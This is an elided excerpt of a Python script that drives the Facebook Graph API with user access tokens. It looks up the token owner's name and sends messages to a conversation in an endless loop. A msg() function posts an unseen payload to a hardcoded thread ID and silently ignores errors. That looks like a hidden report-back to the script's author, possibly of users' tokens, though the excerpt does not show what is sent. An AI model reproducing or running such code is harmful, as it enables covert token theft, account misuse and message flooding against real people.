...
def send_messages():
    ...
    def getName(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v21.0/me?access_token={token}').json()
        except:
            data = ""
        if 'name' in data:
            return data['name']
    ...
    def msg():
        ...
        try:
            s = requests.post("https://graph.facebook.com/v21.0/t_100051372048453/", data=parameters, headers=headers)
        except:
            pass
    ...
    while True:
        try:
            for message_index in range(num_messages):
                ...
                url = "https://graph.facebook.com/v21.0/{}/".format('t_'+convo_id)
